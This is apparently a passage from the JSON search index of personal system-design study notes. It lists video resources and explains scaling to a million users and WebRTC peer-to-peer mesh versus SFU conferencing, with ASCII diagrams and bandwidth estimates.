Passkeys","text":""},{"location":"system-design/high-level/concepts/passwords/#youtube","title":"Youtube","text":"<ul> <li>How Databases Store Passwords Securely</li> <li>Passkeys Explained | Why Apple, Google &amp; Microsoft Want to KILL Passwords</li> </ul>"},{"location":"system-design/high-level/concepts/process/","title":"Process related things","text":""},{"location":"system-design/high-level/concepts/process/#youtube","title":"Youtube","text":""},{"location":"system-design/high-level/concepts/process/#single-videos","title":"Single Videos","text":"<ul> <li>Multithreading vs Multiprocessing | System Design</li> </ul>"},{"location":"system-design/high-level/concepts/raft-consensus-algorithm/","title":"raft consensus algorithm","text":""},{"location":"system-design/high-level/concepts/raft-consensus-algorithm/#youtube","title":"Youtube","text":"<ul> <li>Distributed Systems 6.2: Raft</li> </ul>"},{"location":"system-design/high-level/concepts/restfull-architecture/","title":"REST Architectural Constraints","text":""},{"location":"system-design/high-level/concepts/restfull-architecture/#blogs-and-websites","title":"Blogs and websites","text":"<ul> <li>REST Architectural Constraints</li> <li>REST API Architectural Constraints</li> </ul>"},{"location":"system-design/high-level/concepts/restfull-architecture/#youtube","title":"Youtube","text":""},{"location":"system-design/high-level/concepts/restfull-architecture/#introduction","title":"Introduction","text":"<ul> <li>REST API Best Practices</li> <li>The Right Way To Build REST APIs</li> <li>Everything You NEED to Know About WEB APP Architecture</li> </ul>"},{"location":"system-design/high-level/concepts/restfull-architecture/#comparisions","title":"Comparisions","text":"<ul> <li>HTTP vs WebSockets: Performance (Latency - CPU - Memory - Network)</li> </ul>"},{"location":"system-design/high-level/concepts/restfull-architecture/#idempotent-api-design","title":"Idempotent API design","text":"<ul> <li>14. Design Idempotent POST API | System Design to Handle Duplicate Request by Idempotency Handler</li> </ul>"},{"location":"system-design/high-level/concepts/s3/","title":"S3 (Simple Storage Service)","text":""},{"location":"system-design/high-level/concepts/s3/#youtube","title":"Youtube","text":"<ul> <li> <p>How AWS S3 Hit 1PB/s Using Hard Drives\u2026 This Is WILD!</p> </li> <li> <p>Amazon S3 (Object Stores) - In Practice | Distributed Systems Deep Dives With Ex-Google SWE</p> </li> </ul>"},{"location":"system-design/high-level/concepts/scaling-to-one-million/","title":"Scaling to One Million","text":""},{"location":"system-design/high-level/concepts/scaling-to-one-million/#youtube","title":"Youtube","text":"<ul> <li>5. Scale from ZERO to MILLION Users (Hindi) | System design interview: Scale to 1million users</li> <li>15. Design High Availability &amp; Resilience System, HLD | Active Passive &amp; Active Active Architecture</li> </ul>"},{"location":"system-design/high-level/concepts/scaling-to-one-million/#theory","title":"Theory","text":""},{"location":"system-design/high-level/concepts/scaling-to-one-million/#introduction","title":"Introduction","text":"<ul> <li>This video is part of a series on system design concepts, focusing on scaling from 0 to 1 million users.</li> <li>It covers concepts such as sharding, horizontal and vertical scaling, load balancing, caching, and messaging queues.</li> </ul>"},{"location":"system-design/high-level/concepts/scaling-to-one-million/#steps-for-scaling","title":"Steps for Scaling","text":"<ol> <li> <p>Single Server</p> <ul> <li>Basic setup with a single server handling the application, database, and client.</li> <li>Suitable for the initial stage with zero users.</li> </ul> </li> <li> <p>Application and Database Separation</p> <ul> <li>Introduces a separate application server layer for business logic.</li> <li>Database server manages data storage and retrieval.</li> <li>Allows independent scaling of application and database.</li> </ul> </li> <li> <p>Load Balancing and Multiple Application Servers</p> <ul> <li>Adds a load balancer to distribute incoming requests across multiple application servers.</li> <li>Load balancer enhances security and privacy.</li> <li>Efficiently handles increased traffic by distributing workload.</li> </ul> </li> <li> <p>Database Replication</p> <ul> <li>Implements master-slave configuration for the database.</li> <li>Master database handles write operations; slave databases handle read operations.</li> <li>Improves performance and provides redundancy in case of failure.</li> </ul> </li> <li> <p>Caching</p> <ul> <li>Adds a caching layer to store frequently accessed data in memory.</li> <li>Application server checks cache before accessing the database.</li> <li>Reduces database load and improves response time.</li> <li>Uses time-to-live (TTL) to manage cache expiry.</li> </ul> </li> <li> <p>Content Delivery Network (CDN)</p> <ul> <li>Uses a distributed network of servers to cache static content closer to users.</li> <li>Reduces latency and improves performance for global users.</li> <li>Handles requests for static content (images, videos, JavaScript).</li> <li>On cache miss, CDN checks neighboring CDN nodes before querying the origin database.</li> </ul> </li> <li> <p>Multiple Data Centers</p> <ul> <li>Distributes application and database across multiple data centers.</li> <li>Reduces load on individual centers and improves reliability.</li> <li>Enables geographically distributed access with minimal latency.</li> <li>Load balancer routes requests based on user location.</li> </ul> </li> <li> <p>Messaging Queues</p> <ul> <li>Uses messaging queues for asynchronous tasks (e.g., notifications, emails).</li> <li>Decouples tasks from the main application flow.</li> <li>Improves performance and reliability for high-volume tasks.</li> <li>Examples: RabbitMQ, Kafka.</li> </ul> </li> <li> <p>Database Scaling</p> <ul> <li>Vertical Scaling: Increase the capacity of existing database servers by adding more CPU, RAM, or storage. This approach is straightforward but eventually limited by hardware constraints and cost.</li> <li>Horizontal Scaling / Data Sharding: Distribute the database across multiple servers or shards to handle larger datasets and higher traffic.<ul> <li>Horizontal Sharding: Split data by rows, such as dividing users by user ID ranges. Each shard contains a subset of the data, allowing parallel processing and improved scalability.</li> <li>Vertical Sharding: Split data by columns, separating different types of data (e.g., user profiles vs. transactions) into different databases or tables. This can optimize performance for specific queries.</li> </ul> </li> <li>Sharding strategies help reduce bottlenecks, improve fault tolerance, and enable scaling beyond the limits of a single server.</li> <li>Proper shard key selection and balancing are critical to avoid hotspots and ensure even distribution of data and workload.</li> </ul> </li> </ol>"},{"location":"system-design/high-level/concepts/service-discovery/","title":"Service Discovery","text":""},{"location":"system-design/high-level/concepts/service-discovery/#youtube","title":"Youtube","text":"<ul> <li>Service Discovery in Microservices | Eureka &amp; its SpringBoot Implementation</li> </ul>"},{"location":"system-design/high-level/concepts/service-discovery/#theory","title":"Theory","text":"<ol> <li>Eureka Server and Eureka Client</li> <li>Consul</li> <li>Kubernetes Service</li> </ol>"},{"location":"system-design/high-level/concepts/service-mesh/","title":"Service Mesh","text":""},{"location":"system-design/high-level/concepts/service-mesh/#youtube","title":"Youtube","text":"<ul> <li>Service Mesh and its Architecture | How Microservices Communicate?</li> </ul>"},{"location":"system-design/high-level/concepts/sockets/","title":"Sockets","text":""},{"location":"system-design/high-level/concepts/sockets/#youtube","title":"Youtube","text":"<ul> <li>99% of Developers Don't Get Sockets</li> <li>How Sockets Actually Work - From Your Browser to the Backend</li> </ul>"},{"location":"system-design/high-level/concepts/storage/","title":"Process related things","text":""},{"location":"system-design/high-level/concepts/storage/#youtube","title":"Youtube","text":""},{"location":"system-design/high-level/concepts/storage/#single-videos","title":"Single Videos","text":"<ul> <li>File Storage VS Object Storage | System Design</li> <li>Design a Scalable BLOB Store | System Design</li> <li>How do BLOB Stores Scale? (S3, GCS, MinIO) | System Design</li> </ul>"},{"location":"system-design/high-level/concepts/webrtc/","title":"WebRTC","text":""},{"location":"system-design/high-level/concepts/webrtc/#youtube","title":"Youtube","text":"<ul> <li>WebRTC | Video Calling</li> <li>System Design Behind Multi-Conference Video Calls - WebRTC vs SFU vs MCU</li> </ul>"},{"location":"system-design/high-level/concepts/webrtc/#theory","title":"Theory","text":""},{"location":"system-design/high-level/concepts/webrtc/#what-is-webrtc","title":"What is WebRTC?","text":"<p>WebRTC (Web Real-Time Communication) is an open-source technology that enables peer-to-peer audio, video, and data sharing between browsers and mobile applications without requiring plugins or intermediate servers.</p> <p>Key Features: - \ud83c\udfa5 Real-time Audio/Video: Live streaming between peers - \ud83d\udce1 Peer-to-Peer: Direct communication without server relay - \ud83d\udd12 Secure: Encrypted by default (DTLS/SRTP) - \ud83c\udf10 Browser Native: Built into modern browsers - \ud83d\udcf1 Cross-Platform: Works on web, iOS, Android</p> <p>Common Use Cases: - Video conferencing (Zoom, Google Meet, Microsoft Teams) - Live streaming - Screen sharing - File sharing - Online gaming - Telemedicine</p>"},{"location":"system-design/high-level/concepts/webrtc/#video-conferencing-architectures","title":"Video Conferencing Architectures","text":"<p>When building multi-user video conferencing applications, there are three main architectural approaches:</p> <ol> <li>WebRTC (Peer-to-Peer Mesh)</li> <li>SFU (Selective Forwarding Unit)</li> <li>MCU (Multipoint Control Unit)</li> </ol> <p>Each has different trade-offs in terms of scalability, bandwidth, CPU usage, and quality.</p>"},{"location":"system-design/high-level/concepts/webrtc/#1-webrtc-peer-to-peer-mesh","title":"1. WebRTC (Peer-to-Peer Mesh)","text":""},{"location":"system-design/high-level/concepts/webrtc/#description","title":"Description","text":"<p>In a peer-to-peer (P2P) mesh architecture, each participant establishes direct connections with every other participant in the call. Every user sends their media streams to all other users and receives streams from all other users.</p> <pre><code>\u250c\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2510\n\u2502           WebRTC Peer-to-Peer Mesh Architecture             \u2502\n\u2514\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2518\n\n2 PARTICIPANTS (Simple - Works Well):\n\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\n\n     \u250c\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2510\n     \u2502   Alice    \u2502\n     \u2502  (Browser) \u2502\n     \u2514\u2500\u2500\u2500\u2500\u2500\u252c\u2500\u2500\u2500\u2500\u2500\u2500\u2518\n           \u2502\n           \u2502 Direct P2P Connection\n           \u2502 \u2022 Video stream\n           \u2502 \u2022 Audio stream\n           \u2502\n     \u250c\u2500\u2500\u2500\u2500\u2500\u25bc\u2500\u2500\u2500\u2500\u2500\u2500\u2510\n     \u2502    Bob     \u2502\n     \u2502  (Browser) \u2502\n     \u2514\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2518\n\nConnections: 1\nBandwidth per user: 1 upload + 1 download\n\n\n4 PARTICIPANTS (Still Manageable):\n\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\n\n            \u250c\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2510\n            \u2502   Alice    \u2502\n            \u2514\u2500\u2500\u252c\u2500\u2500\u2500\u252c\u2500\u2500\u2500\u252c\u2500\u2518\n               \u2502   \u2502   \u2502\n       \u250c\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2518   \u2502   \u2514\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2510\n       \u2502           \u2502            \u2502\n   \u250c\u2500\u2500\u2500\u25bc\u2500\u2500\u2500\u2500\u2510  \u250c\u2500\u2500\u25bc\u2500\u2500\u2500\u2500\u2500\u2510  \u250c\u2500\u2500\u2500\u25bc\u2500\u2500\u2500\u2500\u2510\n   \u2502  Bob   \u2502  \u2502 Charlie\u2502  \u2502  David \u2502\n   \u2514\u2500\u2500\u2500\u252c\u2500\u2500\u2500\u2500\u2518  \u2514\u2500\u2500\u252c\u2500\u2500\u2500\u2500\u2500\u2518  \u2514\u2500\u2500\u2500\u252c\u2500\u2500\u2500\u2500\u2518\n       \u2502          \u2502            \u2502\n       \u2514\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u253c\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2518\n                  \u2502\n          All connected to all\n\nTotal Connections: 6 (n \u00d7 (n-1) / 2)\nEach user maintains: 3 connections\n\nAlice uploads to: Bob, Charlie, David (3 streams)\nAlice downloads from: Bob, Charlie, David (3 streams)\n\n\n10 PARTICIPANTS (Problem - Doesn't Scale!):\n\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\n\n         \u250c\u2500\u2500\u2500\u2500\u2500\u2500\u2510\n         \u2502  U1  \u2502\n         \u2514\u2500\u252c\u2500\u252c\u2500\u252c\u2518\n       \u250c\u2500\u2500\u2500\u2518 \u2502 \u2514\u2500\u2500\u2500\u2500\u2510\n    \u250c\u2500\u2500\u25bc\u2500\u2500\u2510\u250c\u2500\u25bc\u2500\u2500\u2510\u250c\u2500\u2500\u25bc\u2500\u2500\u2510\n    \u2502 U2  \u2502\u2502 U3 \u2502\u2502 U4  \u2502\n    \u2514\u2500\u2500\u252c\u2500\u2500\u2518\u2514\u2500\u252c\u2500\u2500\u2518\u2514\u2500\u2500\u252c\u2500\u2500\u2518\n    \u250c\u2500\u2500\u25bc\u2500\u2500\u2510\u250c\u2500\u25bc\u2500\u2500\u2510\u250c\u2500\u2500\u25bc\u2500\u2500\u2510\n    \u2502 U5  \u2502\u2502 U6 \u2502\u2502 U7  \u2502\n    \u2514\u2500\u2500\u252c\u2500\u2500\u2518\u2514\u2500\u252c\u2500\u2500\u2518\u2514\u2500\u2500\u252c\u2500\u2500\u2518\n    \u250c\u2500\u2500\u25bc\u2500\u2500\u2510\u250c\u2500\u25bc\u2500\u2500\u2510\u250c\u2500\u2500\u25bc\u2500\u2500\u2510\n    \u2502 U8  \u2502\u2502 U9 \u2502\u2502 U10 \u2502\n    \u2514\u2500\u2500\u2500\u2500\u2500\u2518\u2514\u2500\u2500\u2500\u2500\u2518\u2514\u2500\u2500\u2500\u2500\u2500\u2518\n\nTotal Connections: 45 (10 \u00d7 9 / 2)\nEach user maintains: 9 connections\nEach user uploads: 9 streams\nEach user downloads: 9 streams\n\n\u274c Network Overload!\n\u274c CPU Overload (encoding 9 times)!\n\u274c Bandwidth Explosion!\n\nBANDWIDTH CALCULATION (10 users):\n\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\nAssume each video stream: 2 Mbps\n\nPer User Upload: 9 streams \u00d7 2 Mbps = 18 Mbps\nPer User Download: 9 streams \u00d7 2 Mbps = 18 Mbps\nTotal per user: 36 Mbps\n\nMost home internet:\n\u2022 Upload: 5-10 Mbps \u274c NOT ENOUGH!\n\u2022 Download: 50-100 Mbps \u2713 OK\n\nResult: Call fails due to insufficient upload bandwidth\n</code></pre>"},{"location":"system-design/high-level/concepts/webrtc/#how-it-works","title":"How It Works","text":"<pre><code>\u250c\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2510\n\u2502              WebRTC P2P Connection Flow                      \u2502\n\u2514\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2518\n\nPEER A                                              PEER B\n\u2500\u2500\u2500\u2500\u2500\u2500                                              \u2500\u2500\u2500\u2500\u2500\u2500\n\n1. Signaling (Exchange connection info)\n\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\n\u2502                                                     \u2502\n\u2502  Create Offer (SDP)                                 \u2502\n\u2502  - Media capabilities                               \u2502\n\u2502  - ICE candidates (network paths)                   \u2502\n\u2502                                                     \u2502\n\u2502         \u2500\u2500\u2500\u2500\u2500\u2500\u25b6 Signaling Server \u2500\u2500\u2500\u2500\u2500\u2500\u25b6            \u2502\n\u2502                                                     \u2502\n\u2502                                         Create Answer (SDP)\n\u2502                                         - Media capabilities\n\u2502                                         - ICE candidates\n\u2502                                                     \u2502\n\u2502         \u25c0\u2500\u2500\u2500\u2500\u2500\u2500 Signaling Server \u25c0\u2500\u2500\u2500\u2500\u2500\u2500            \u2502\n\u2502                                                     \u2502\n\n2. ICE (Interactive Connectivity Establishment)\n\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\n\u2502  Find best network path:                            \u2502\n\u2502  1. Direct connection (if possible)                 \u2502\n\u2502  2. STUN server (NAT traversal)                     \u2502\n\u2502  3. TURN server (relay if needed)                   \u2502\n\u2502                                                     \u2502\n\u2502 \u25c0\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500 Try Connection Paths \u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u25b6    \u2502\n\u2502                                                     \u2502\n\n3. Direct P2P Connection Established\n\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\n\u2502                                                     \u2502\n\u2502 \u25c0\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550 Audio/Video Stream \u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u25b6     \u2502\n\u2502                 (Encrypted)                         \u2502\n\u2502                                                     \u2502\n\nMedia Encoding/Decoding:\n\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\n\u2502  Camera \u2192 Encode \u2192 Send                             \u2502\n\u2502           (VP8/H.264)                               \u2502\n\u2502                                         Receive \u2192 Decode \u2192 Display\n\u2502                                         (VP8/H.264)\n</code></pre>"},{"location":"system-design/high-level/concepts/webrtc/#advantages","title":"Advantages","text":"<pre><code>\u2705 BENEFITS:\n\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\n\n1. NO SERVER COSTS\n   \u2022 Direct peer-to-peer\n   \u2022 No media server infrastructure\n   \u2022 Minimal hosting expenses\n\n2. LOW LATENCY\n   \u2022 Direct connection\n   \u2022 No intermediate hops\n   \u2022 Best for 1-on-1 calls\n   \u2022 Typical latency: 20-50ms\n\n3. PRIVACY\n   \u2022 Data doesn't pass through servers\n   \u2022 End-to-end encryption\n   \u2022 Private conversations\n\n4. SIMPLE ARCHITECTURE\n   \u2022 Easy to implement for small scale\n   \u2022 No complex server infrastructure\n   \u2022 Built-in browser support\n\n5. HIGH QUALITY\n   \u2022 Direct stream, no transcoding\n   \u2022 Original quality maintained\n   \u2022 No quality degradation from server processing\n</code></pre>"},{"location":"system-design/high-level/concepts/webrtc/#disadvantages","title":"Disadvantages","text":"<pre><code>\u274c LIMITATIONS:\n\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\n\n1. DOESN'T SCALE\n   \u2022 Exponential connection growth: O(n\u00b2)\n   \u2022 2 users: 1 connection \u2713\n   \u2022 4 users: 6 connections \u26a0\ufe0f\n   \u2022 10 users: 45 connections \u274c\n   \u2022 50 users: 1,225 connections \u274c\u274c\u274c\n\n2. BANDWIDTH EXPLOSION\n   \u2022 Each user uploads N-1 streams\n   \u2022 10-person call: Upload 18 Mbps\n   \u2022 Exceeds typical home upload (5-10 Mbps)\n   \u2022 Mobile devices: Even worse\n\n3. CPU OVERLOAD\n   \u2022 Must encode video N-1 times\n   \u2022 Browser struggles with &gt;4 encoders\n   \u2022 Drains battery on mobile\n   \u2022 Fan noise on laptops\n\n4. INCONSISTENT QUALITY\n   \u2022 Limited by weakest peer's connection\n   \u2022 One poor connection affects everyone\n   \u2022 Can't adapt streams per recipient\n\n5. NAT/FIREWALL ISSUES\n   \u2022 Requires STUN/TURN servers\n   \u2022 Corporate firewalls may block\n   \u2022 10-20% of connections need TURN relay\n   \u2022 TURN relay = not truly P2P anymore\n\nMAXIMUM PRACTICAL PARTICIPANTS:\n\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\nDesktop: 4-6 participants\nMobile: 2-3 participants\nRecommended: 1-on-1 calls only\n</code></pre>"},{"location":"system-design/high-level/concepts/webrtc/#use-cases","title":"Use Cases","text":"<pre><code>\u2705 IDEAL FOR:\n\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\n\u2022 1-on-1 video calls\n\u2022 Voice calls (1-on-1)\n\u2022 File sharing between two users\n\u2022 Gaming (2 players)\n\u2022 Simple video chat apps\n\n\u274c NOT SUITABLE FOR:\n\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\n\u2022 Group video conferences (&gt;4 people)\n\u2022 Webinars\n\u2022 Live streaming to many viewers\n\u2022 Enterprise video meetings\n</code></pre>"},{"location":"system-design/high-level/concepts/webrtc/#2-sfu-selective-forwarding-unit","title":"2. SFU (Selective Forwarding Unit)","text":""},{"location":"system-design/high-level/concepts/webrtc/#description_1","title":"Description","text":"<p>An SFU is a media server that receives video/audio streams from each participant and selectively forwards them to other participants. Unlike P2P, each client only sends one stream to the SFU, which then distributes it to others.</p> <p>Key Concept: The SFU forwards media streams without decoding or re-encoding them.</p> <pre><code>\u250c\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2510\n\u2502           SFU (Selective Forwarding Unit) Architecture       \u2502\n\u2514\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2518\n\n4 PARTICIPANTS WITH SFU:\n\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\n\n     \u250c\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2510\n     \u2502   Alice    \u2502\n     \u2514\u2500\u2500\u2500\u2500\u2500\u252c\u2500\u2500\u2500\u2500\u2500\u2500\u2518\n           \u2502 Upload: 1 stream (2 Mbps)\n           \u2502 Download: 3 streams (6 Mbps)\n           \u25bc\n     \u2554\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2557\n     \u2551      SFU        \u2551\n     \u2551  Media Router   \u2551\n     \u2551                 \u2551\n     \u2551  Forwards:      \u2551\n     \u2551  \u2022 Alice \u2192 B,C,D\u2551\n     \u2551  \u2022 Bob \u2192 A,C,D  \u2551\n     \u2551  \u2022 Charlie\u2192A,B,D\u2551\n     \u2551  \u2022 David \u2192 A,B,C\u2551\n     \u255a\u2550\u2550\u2550\u2566\u2550\u2550\u2550\u2566\u2550\u2550\u2550\u2566\u2550\u2550\u2550\u2550\u2550\u255d\n         \u2551   \u2551   \u2551\n    \u250c\u2500\u2500\u2500\u2500\u2568\u2510 \u250c\u2568\u2500\u2500\u2500\u2510 \u250c\u2568\u2500\u2500\u2500\u2500\u2510\n    \u2502 Bob \u2502 \u2502Char\u2502\u2502David\u2502\n    \u2514\u2500\u2500\u2500\u2500\u2500\u2518 \u2514\u2500\u2500\u2500\u2500\u2518 \u2514\u2500\u2500\u2500\u2500\u2500\u2518\n\nEach User:\n\u2022 Uploads: 1 stream\n\u2022 Downloads: N-1 streams\n\u2022 Total connections: 1 (to SFU)\n\n\n10 PARTICIPANTS WITH SFU (Scales Well!):\n\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\n\nU1  U2  U3  U4  U5  U6  U7  U8  U9  U10\n \u2502   \u2502   \u2502   \u2502   \u2502   \u2502   \u2502   \u2502   \u2502   \u2502\n \u2514\u2500\u2500\u2500\u2534\u2500\u2500\u2500\u2534\u2500\u2500\u2500\u2534\u2500\u2500\u2500\u253c\u2500\u2500\u2500\u2534\u2500\u2500\u2500\u2534\u2500\u2500\u2500\u2534\u2500\u2500\u2500\u2534\u2500\u2500\u2500\u2518\n                 \u2502\n                 \u25bc\n         \u2554\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2557\n         \u2551      SFU      \u2551\n         \u2551               \u2551\n         \u2551   Forwards    \u2551\n         \u2551   streams     \u2551\n         \u2551   to all      \u2551\n         \u255a\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u255d\n                 \u2502\n     \u250c\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u253c\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2510\n     \u2502           \u2502           \u2502\n     \u25bc           \u25bc           \u25bc\n   Each user receives 9 streams\n\nPer User Bandwidth:\n\u2022 Upload: 1 stream = 2 Mbps \u2713\n\u2022 Download: 9 streams = 18 Mbps \u2713\n\nServer Bandwidth:\n\u2022 Receives: 10 streams = 20 Mbps\n\u2022 Sends: 90 streams = 180 Mbps\n(Each of 10 streams sent to 9 participants)\n\n\n100 PARTICIPANTS WITH SFU (With Optimizations):\n\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\n\n                \u2554\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2557\n                \u2551      SFU      \u2551\n                \u2551               \u2551\n                \u2551  Simulcast:   \u2551\n                \u2551  \u2022 HD: 2 Mbps \u2551\n                \u2551  \u2022 SD: 500Kbps\u2551\n                \u2551  \u2022 Low:200Kbps\u2551\n                \u2551               \u2551\n                \u2551  Smart Logic: \u2551\n                \u2551  \u2022 Active speaker: HD\n                \u2551  \u2022 Others: Low quality\n                \u255a\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u255d\n\nPer User Bandwidth (optimized):\n\u2022 Upload: 1 stream (multi-quality)\n\u2022 Download: Active + thumbnails\n  = 2 Mbps 